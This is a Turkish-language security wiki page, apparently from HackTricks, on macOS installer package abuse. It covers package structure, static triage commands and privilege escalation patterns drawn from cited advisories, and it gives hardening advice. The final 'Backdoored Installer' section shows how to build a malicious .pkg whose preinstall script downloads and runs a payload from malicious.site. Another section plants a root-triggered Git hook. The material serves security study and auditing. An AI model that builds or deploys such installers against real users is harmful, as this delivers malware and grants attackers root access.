# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Temel Bilgileri

Bir macOS **installer package** (aynı zamanda `.pkg` file olarak da bilinir), macOS tarafından **software dağıtmak** için kullanılan bir file formatıdır. Bu file'lar, bir software parçasının doğru şekilde kurulup çalışması için ihtiyaç duyduğu her şeyi içeren bir **kutu** gibidir.

Package file'ın kendisi, **target** bilgisayara kurulacak **file ve directory hiyerarşisini** barındıran bir arşivdir. Ayrıca installation öncesi ve sonrası görevleri gerçekleştirmek için **script'ler** de içerebilir; örneğin configuration file'larını ayarlamak veya software'in eski versiyonlarını temizlemek gibi.

### Package Structure

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customization'lar (title, welcome text…) ve script/installation kontrolleri
- **PackageInfo (xml)**: Bilgiler, installation gereksinimleri, installation location, çalıştırılacak script'lerin path'leri
- **Bill of materials (bom)**: File permission'larıyla birlikte kurulacak, update edilecek veya kaldırılacak file'ların listesi
- **Payload (CPIO archive gzip compressed)**: PackageInfo'daki `install-location` içine kurulacak file'lar
- **Scripts (CPIO archive gzip compressed)**: Execution için geçici bir directory'ye çıkarılan pre ve post installation script'leri ve diğer resource'lar

### Sıkıştırmayı Açma
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Installer içeriğini manuel olarak decompress etmeden görüntülemek için ücretsiz [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) aracını da kullanabilirsiniz.

### Static triage kısayolları

Amaç analysis ise paketi önce `Installer.app` ile açmaktan **kaçınmayı** deneyin. Bazı paketler Installer bunları açar açmaz code çalıştırabilir (örneğin `system.run()` veya installer plug-in'leri aracılığıyla); bu nedenle offline extraction genellikle daha güvenli bir başlangıçtır.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG Temel Bilgileri

DMG dosyaları veya Apple Disk Images, Apple'ın macOS işletim sistemi tarafından disk images için kullanılan bir dosya formatıdır. DMG dosyası temel olarak, genellikle sıkıştırılmış ve bazen şifrelenmiş ham blok verileri içeren **mount edilebilir bir disk image**'dır (kendi filesystem'ını içerir). Bir DMG dosyasını açtığınızda macOS, içeriğine erişebilmeniz için onu **fiziksel bir diskmiş gibi mount eder**.

> [!CAUTION]
> **`.dmg`** installer'larının **çok fazla formatı** desteklediğini ve geçmişte bazıları vulnerability içerdiği için **kernel code execution** elde etmek amacıyla abuse edildiğini unutmayın.

### Disk Image Yapısı

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Bir DMG dosyasının hiyerarşisi içeriğe göre farklı olabilir. Ancak application DMG'leri için genellikle şu yapıyı izler:

- Top Level: Disk image'ın root seviyesidir. Genellikle application'ı ve muhtemelen Applications klasörüne bir link içerir.
- Application (.app): Gerçek application'dır. macOS'ta application genellikle application'ı oluşturan birçok ayrı dosya ve klasör içeren bir package'tır.
- Applications Link: macOS'taki Applications klasörüne giden bir shortcut'tır. Bunun amacı application'ı yüklemenizi kolaylaştırmaktır. .app dosyasını application'ı yüklemek için bu shortcut'ın üzerine sürükleyebilirsiniz.

## pkg abuse ile Privesc

### Public directory'lerden execution

Bir pre- veya post-installation script, **`/var/tmp/Installerutil`** gibi bir dosyayı çalıştırıyorsa ve attacker bu dosyayı değiştirebiliyorsa, installer dosyayı çağırdığında attacker privilege escalation gerçekleştirebilir. Belirtilen konuşmalar ve walkthrough, bu güvensiz external-script pattern'inin farklı varyantlarını gösterir.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Bu, çeşitli installer'ların ve updater'ların **root olarak bir şey çalıştırmak** için çağırdığı bir [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)'dır. Bu function, parametre olarak **çalıştırılacak** **file**'ın **path**'ini kabul eder; ancak bir attacker bu dosyayı **modify** edebilirse, root ile çalıştırılmasını **abuse** ederek **privilege escalation** gerçekleştirebilir.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Daha fazla bilgi için bu konuşmaya göz atın: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Environment ve shebang abuse

Modern PackageKit açıkları, installer script'lerinin genellikle **trusted root code** olarak yürütülürken saldırgan tarafından kontrol edilen bağlamı yakında tutmaya devam ettiğini gösterdi. Vendor package'lerini denetlerken özellikle şunlara dikkat edin:

- `#!/bin/zsh` / `#!/bin/bash` gibi Shell interpreter'ları
- `sudo -u $USER`, `launchctl asuser` gibi çağrılar veya `$USER`, `$HOME`, `PATH`, `TMPDIR` ya da relative path'lere güvenen herhangi bir mantık
- Kullanıcı tarafından kontrol edilen init file'larını veya library'leri yükleyebilen non-shell interpreter'lar
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
2024 PackageKit root-environment bug'ı (`~/.zshenv` / `~/.bash*` kullanıcı tarafından başlatılan kurulumlar sırasında inheritance) için [generic macOS privesc page](../macos-privilege-escalation.md) sayfasına bakın. Paket **Apple-signed** ise aynı script bug'ı **SIP/TCC-relevant** hâle gelebilir; çünkü `system_installd` `com.apple.rootless.install.heritable` taşıyabilir. [SIP page](../macos-security-protections/macos-sip.md) sayfasına bakın.<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Stateful inputs and implicit callbacks

İncelemeyi yalnızca bariz command injection ile sınırlamayın. Root `preinstall`/`postinstall`, kurulumdan önce mevcut olan **state**'i tükettiğinde bir trust boundary'yi aşabilir: `/tmp` veya `/var/tmp` içindeki öngörülebilir dosyalar, mevcut user-writable installation tree, configuration files, repository metadata veya daha sonra `chown` komutuna aktarılan bir username.<sup>[[9]](#references)[[10]](#references)</sup>

Yakın tarihli iki Homebrew installer flaw'ı yeniden kullanılabilir varyantları göstermektedir:

- **Attacker-selected ownership:** package-user override, owner, mode, ACL'ler, symlink state'i veya provenance doğrulanmadan öngörülebilir `/var/tmp/.homebrew_pkg_user.plist` dosyasından okundu. Low-privileged bir user kendi hesabını seçebildi ve daha sonra çalışan bir root `postinstall`, Homebrew tree'sinin ve cache'inin ownership'ini recursive olarak bu hesaba devretti. Bu shell injection değil, bir privilege-assignment flaw'ıydı.<sup>[[9]](#references)</sup>
- **Existing tree üzerinden tool callbacks:** root `postinstall`, normal user'ı tarafından bilerek writable bırakılmış bir installation içinde `git checkout` çalıştırdı. Bu nedenle executable bir `.git/hooks/post-checkout` yerleştirmek, daha sonra gerçekleşen bir GUI/MDM package upgrade'ini root code execution'a dönüştürdü. Intel path'inde, packaged `.git` directory'sinin mevcut repository ile merge edilmesi attacker-added hooks'ları da korudu.<sup>[[10]](#references)</sup>

İkinci primitive, authorized test sırasında modellenmesi kolaydır; trigger yalnızca vulnerable privileged installer daha sonra hook-capable bir Git operation çalıştırdığında gerçekleşir.<sup>[[10]](#references)</sup>
```bash
repo=/path/to/user-writable/install
mkdir -p "$repo/.git/hooks"
cat > "$repo/.git/hooks/post-checkout" <<'EOF'
#!/bin/sh
id > /tmp/pkg-post-checkout-context
EOF
chmod +x "$repo/.git/hooks/post-checkout"
# Wait for the privileged .pkg install/upgrade; do not invoke it as root just to test.
```
İç içe paketleri genişletin ve saldırganın kontrolündeki her kaynağı ayrıcalıklı bir sink ile eşleştirin. Doğrudan çalıştırmanın yanı sıra parser'ları, sahiplik değişikliklerini ve plug-in/hook mekanizmalarına sahip araçları arayın.<sup>[[9]](#references)[[10]](#references)</sup>
```bash
PKG=Target.pkg
OUT=$(mktemp -d)
pkgutil --expand-full "$PKG" "$OUT"
grep -RniE '(/var/tmp|/tmp|defaults[[:space:]]+read|PlistBuddy|chown[[:space:]]+-R)' "$OUT"
grep -RniE '(^|[;&|[:space:]])(git|svn|hg|npm|pip|ruby|python)[[:space:]]' "$OUT"
grep -RniE '(checkout|reset|submodule|hooksPath|GIT_(DIR|CONFIG)|PYTHONPATH|RUBYOPT)' "$OUT"
```
Sağlamlaştırma için privileged input'ları root-owned bir staging dizinine taşıyın ve her path'i kullanmadan hemen önce doğrulayın (regular file, beklenen owner/mode, unsafe ACL olmaması ve symlink traversal olmaması). Güvenilmeyen bir identity üzerinden ownership'i recursive olarak değiştirmekten kaçının. Git'in önceden var olan bir tree üzerinde çalışması gerektiğinde callback'leri açıkça devre dışı bırakın (örneğin, `git -c core.hooksPath=/dev/null ...`) veya Git'i çağırmadan önce repository metadata'sını atomik olarak değiştirin.<sup>[[9]](#references)[[10]](#references)</sup>

### Mount ederek çalıştırma

Bir installer `/tmp/fixedname/bla/bla` konumuna yazıyorsa, `/tmp/fixedname` üzerine `noowners` ile bir **mount oluşturmak** ve böylece **installation süreci sırasında herhangi bir dosyayı değiştirmek** mümkün olabilir.

Buna örnek olarak, **root olarak execution** elde etmek için **periodic bir script'i overwrite etmeyi** başaran **CVE-2021-26089** verilebilir. Daha fazla bilgi için şu konuşmaya bakabilirsiniz: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg malware olarak

### Empty Payload

İçinde script'lerdeki malware dışında gerçek bir payload bulunmadan yalnızca **pre ve post-install script'lerine** sahip bir **`.pkg`** dosyası oluşturmak mümkündür.<sup>[[2]](#references)</sup>

### Distribution xml'de JS

Paketin **distribution xml** dosyasına **`<script>`** tag'leri eklemek mümkündür; bu code çalıştırılır ve **`system.run`** kullanılarak **command'ler execute edilebilir**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Distribution package'lerinde bu genellikle, `allow-external-scripts="true"` gibi bir ayarla external script'leri etkinleştiren en üst düzey `Distribution` dosyasına bağlıdır. Bu nedenle yalnızca `preinstall` / `postinstall` incelemesi yeterli değildir: **Distribution XML'in kendisi** `installation-check` / `volume-check` hook'larını ve doğrudan `system.run()` / `system.runOnce()` execution path'lerini içerebilir.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Backdoored Installer

dist.xml içinde script ve JS code kullanan malicious installer
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Pkg'leri Açmak: macOS Installer Paketlerinin İçine Bir Bakış ve Yaygın Security Açıkları](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "macOS Installer'larının Vahşi Dünyası" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Pkg'leri Açmak: macOS Installer Paketlerinin İçine Bir Bakış](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming: Installer Paketlerini Exploit Etme](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Apple tarafından imzalanmış Paketlerle SIP'yi Kırmak](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Bug Dağı" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - macOS'ta 1000 Installer Tarafından Ölüm ve Her Şey Bozuk!](https://www.youtube.com/watch?v=lTOItyjTTkw)
- [9] [Homebrew macOS installer'ı, kullanıcı tarafından kontrol edilen bir package-user plist'ine güveniyor](https://github.com/Homebrew/brew/security/advisories/GHSA-59v8-x8q4-px5c)
- [10] [macOS PKG postinstall içindeki Git hook'ları aracılığıyla root code execution](https://github.com/Homebrew/brew/security/advisories/GHSA-6689-q779-c33m)
{{#include ../../../banners/hacktricks-training.md}}
